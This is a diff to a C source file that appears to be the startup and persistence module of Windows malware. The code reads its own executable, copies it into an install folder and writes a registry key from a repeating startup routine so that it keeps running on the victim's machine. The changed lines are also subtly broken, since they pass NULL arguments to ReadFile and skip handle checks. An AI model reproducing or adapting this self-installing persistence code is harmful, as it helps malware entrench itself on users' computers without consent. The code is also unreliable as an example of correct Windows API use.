@@ -1,5 +1,4 @@
 #include "Startup.h"
-
 // Forward declarations not present in header
 BOOL WriteBufferToDisk(LPWSTR wStrFilePath, LPBYTE ptrBuffer, DWORD dwSizeofBuffer, DWORD dwFileAttributes);
 BOOL MakeDirectory(LPWSTR wStrDirectoryPath, DWORD dwFolderAttributes);
@@ -105,7 +104,7 @@ BOOL MakeDirectory(LPWSTR wStrDirectoryPath, DWORD dwFolderAttributes) {
 	return bSuccess;
 }
 
-BOOL CreateRegKey(LPWSTR wStrRegKeyName, LPWSTR wStrRegKeyValue) {
+BOOL CreateRegKey(LPWSTR wStrRegKeyName, LPWSTR wStrRegKeyValue) { 
 
 	BOOL bSuccess = FALSE;
 	HKEY hKey = NULL;
@@ -146,12 +145,15 @@ BOOL DoInitialInstallation(PINSTALLATION_INFO ptrInfo,
 
 	BOOL bSuccess = FALSE;
 
+	// FIXTHIS : Correctly map PE into buffer totally in-memory 
+	
+	/*
 	// Get current imagebase
 	HMODULE hCurrentModule = GetModuleHandleW(NULL);
 	if (!hCurrentModule) {
 		return bSuccess;
 	}
-
+	
 	// Read PE from imagebase
 	PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)hCurrentModule;
 	if (pIDH->e_magic != IMAGE_DOS_SIGNATURE) {
@@ -162,19 +164,46 @@ BOOL DoInitialInstallation(PINSTALLATION_INFO ptrInfo,
 	if (pINH->Signature != IMAGE_NT_SIGNATURE) {
 		return bSuccess;
 	}
-
+	
 	// Read current PE size
 	DWORD dwExeSize = pINH->OptionalHeader.SizeOfImage;
 
 	// Allocate a buffer to copy the current PE into
-	LPBYTE ptrExeBuffer = (LPBYTE)malloc(dwExeSize);
+	LPBYTE ptrExeBuffer = (LPBYTE)malloc(dwExeSize + 1);
+	if (!ptrExeBuffer) {
+		return bSuccess;
+	}
+
+	*/ 
+
+	// Temporary
+	// get a physical handle to self instead of in-memory one
+	WCHAR lpszSfxPath[MAX_PATH];
+	GetModuleFileNameW(NULL, lpszSfxPath, MAX_PATH);
+	HANDLE hFile = CreateFileW(lpszSfxPath,
+		GENERIC_READ,
+		FILE_SHARE_READ,
+		NULL,
+		OPEN_EXISTING,
+		FILE_ATTRIBUTE_NORMAL,
+		NULL);
+	
+	DWORD dwExeSize = GetFileSize(hFile, NULL);
+	LPVOID fileData = HeapAlloc(GetProcessHeap(), 0, dwExeSize); 
+	if (!ReadFile(hFile, fileData, dwExeSize, NULL, NULL)) // fill buffer
+	{
+		return bSuccess;
+	}
+
+	// initiate vacant buffer
+	LPBYTE ptrExeBuffer = (LPBYTE)malloc(dwExeSize + 1);
 	if (!ptrExeBuffer) {
 		return bSuccess;
 	}
 
 	// Copy current PE into buffer
-	// memcpy_s(ptrExeButter, pINH->OptionalHeader.SizeOfImage, hCurrentModule, pINH->OptionalHeader.SizeOfImage);
-	memcpy(ptrExeBuffer, hCurrentModule, dwExeSize);
+	memcpy_s(ptrExeBuffer, dwExeSize, fileData, dwExeSize);
+	
 
 	// Concatenate folder name
 	LPWSTR wStrConcatenatedFolder = ConcatenateInstallFolder(ptrInfo->wStrFolderName);
@@ -253,7 +282,5 @@ VOID RunStartupRoutine(LPVOID lpParam) {
 		}
 
 		CreateRegKey(ptrInstallInfo->wStrRegKeyName, ptrStrFile);
-
-		Sleep(1000);
 	}
 }
